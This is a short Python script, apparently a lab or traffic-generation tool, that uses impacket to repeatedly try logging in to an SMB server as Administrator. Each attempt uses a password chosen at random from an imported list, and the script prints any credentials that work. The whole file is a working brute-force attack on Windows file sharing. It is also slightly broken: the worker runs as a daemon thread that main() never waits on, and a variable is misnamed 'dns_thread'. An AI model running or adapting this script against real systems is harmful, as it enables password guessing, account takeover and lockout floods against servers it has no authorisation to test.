from impacket.smbconnection import SMBConnection
import random
import threading
import time
from utils import passwords, SMB_SERVER_IP

def smb_flood_work(target_host):
    while True:
        password = random.choice(passwords)
        conn = None
        try:
            conn = SMBConnection(target_host, target_host)
            conn.login("Administrator", password)
            print(f"SUCCESS: Administrator:{password}")
            conn.logoff()
        except Exception:
            pass
        finally:
            if conn:
                conn.close()
        time.sleep(random.randrange(5)/1000)

def smb_flood(target_host):
    t = threading.Thread(target=smb_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    dns_thread = smb_flood(SMB_SERVER_IP)

if __name__ == "__main__":
    main()